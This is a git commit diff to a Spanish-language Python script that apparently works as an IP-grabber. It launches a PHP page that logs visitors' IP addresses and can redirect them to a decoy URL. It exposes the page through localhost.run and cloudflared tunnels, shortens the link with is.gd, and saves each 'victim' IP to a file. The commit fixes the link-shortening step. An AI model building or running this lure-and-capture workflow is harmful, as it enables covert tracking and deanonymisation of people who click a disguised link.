abb2d33501bd45463d4c094066962ed6c4ba764b
Euronymou5 <85043356+Euronymou5@users.noreply.github.com>
2023-09-29 15:54:56 -0600

    Bug arreglado al acortar url de cloudflare.

--- run.py
+++ run.py
@@ -37,6 +37,7 @@ def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
 
 lh_file = "logs/lh.log"
 cf_file = "logs/cf.log"
+
 cf_log = open(cf_file, 'w')
 lh_log = open(lh_file, 'w')
 
@@ -61,23 +62,30 @@ logo = """\033[33m
 def check():
     while True:
         if os.path.isfile('ip.txt'):
-          print(' ')
+          print()
           print('\n\033[94m[~] IP de la victima encontrado!')
           with open('ip.txt') as ip:
             lines = ip.read().rstrip()
             if len(lines) != 0:
-                print(' ')
+                print()
+
                 os.system("cat ip.txt")
                 os.system("cat ip.txt >> ip_guardadas.txt")
+
                 print('\n\033[32m[~] IP guardados en: ip_guardadas.txt')
+
                 os.remove("ip.txt")
           ip.close()
 
 def server():
     os.system("clear")
+
     print(logo)
+
     print('[~] Iniciando servidor php...')
+
     var1 = input('\n[~] ¿Quieres utilizar la pagina por default? (Error 404 HTML) [Y/n]: ')
+
     if var1 == "y" or var1 == "Y":
       file = open('index.php', 'r+')
       ler = file.read()
@@ -86,7 +94,9 @@ def server():
         pass
       else:
         global file2
+
         os.remove('index.php')
+
         file2 = open('index.php', 'w')
         file2.write("""<?php
 include 'ip.php';
@@ -96,9 +106,12 @@ exit();
         file2.close()
       print('\n[~] Utilizando el puerto: 8080')
       print('\n[~] Creando link...')
+
       time.sleep(2)
+
       os.system("php -S localhost:8080 > /dev/null 2>&1 &")
       bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lh_log, stderr=lh_log)
+
       ola = False
       for i in range(10):
          lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lh_file)
@@ -106,7 +119,9 @@ exit();
               ola = True
               break
          time.sleep(1)
+
       bgtask(f"./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
+
       cf_success = False
       for i in range(10):
           cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
@@ -114,29 +129,41 @@ exit();
               cf_success = True
               break
           time.sleep(1)
+
       print(f'\n\033[32m[~] Localhost.run: {lhr_url}')
       print(f'\n\033[32m[~] Cloudflared: {cf_url}')
-      with open('short.txt', 'w') as shorturl:
-          s = pyshorteners.Shortener()
-          ey = s.isgd.short(cf_url)
-          shorturl.write(ey)
-      print(f'\n\033[34m[~] Link acortado: {ey}')
-      os.remove('short.txt')
+      try:
+          with open('short.txt', 'w') as shorturl:
+             s = pyshorteners.Shortener()
+             ey = s.isgd.short(lhr_url)
+             shorturl.write(ey)
+
+          print(f'\n\033[34m[~] Link acortado: {ey}')
+          os.remove('short.txt')
+      except:
+        print('\n\033[31m[!] Ha ocurrio un error al intentar acortar la url.')
+        pass
+
       print('\n\033[33m[~] Esperando datos...')
       check()
+
     elif var1 == "n" or var1 == "N":
-      link = input('\n[~] Ingresa el link para redirigir a la victima (e.j: https://youtube.com): ')      
+      link = input('\n[~] Ingresa una url para redirigir a la victima (e.j: https://youtube.com): ')
+
       file = open('index.php', 'w')
       file.write("""<?php
 include 'ip.php';
 header('Location: index.html');
 exit();
 ?>""".replace("index.html", link))
-      file.close()     
+      file.close()
+
       print('\n[~] Utilizando el puerto: 8080')
       print('\n[~] Creando link...')
+
       os.system("php -S localhost:8080 > /dev/null 2>&1 &")
       bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lh_log, stderr=lh_log)
+
       ola = False
       for i in range(10):
          lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lh_file)
@@ -144,7 +171,9 @@ exit();
               ola = True
               break
          time.sleep(1)
+        
       bgtask(f"./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
+
       cf_success = False
       for i in range(10):
           cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
@@ -152,21 +181,32 @@ exit();
               cf_success = True
               break
           time.sleep(1)
+
       print(f'\n\033[32m[~] Localhost.run: {lhr_url}')
       print(f'\n\033[32m[~] Cloudflared: {cf_url}')
-      with open('short.txt', 'w') as shorturl:
-          s = pyshorteners.Shortener()
-          ey = s.isgd.short(cf_url)
-          shorturl.write(ey)
+      
+      try:
+          with open('short.txt', 'w') as shorturl:
+             s = pyshorteners.Shortener()
+             ey = s.isgd.short(lhr_url)
+             shorturl.write(ey)
+      except:
+        print('\n\033[31m[!] Ha ocurrio un error al intentar acortar la url.')
+        pass
+
       print(f'\n\033[34m[~] Link acortado: {ey}')
+
       os.remove('short.txt')
+
       print('\n[~] Esperando datos...')
       check()
 
 def menu():
     os.system("killall php")
     os.system("clear")
+
     print(logo)
+
     print('\n[1] Iniciar servidor php')
     print('[99] Salir')
     T = int(input('\n>> '))
@@ -178,6 +218,6 @@ def menu():
         print('\n\033[31m[!] Error opcion invalida.')
         time.sleep(2)
         menu()
-        
-        
-menu()
+
+if __name__ == "__main__":  
+    menu()
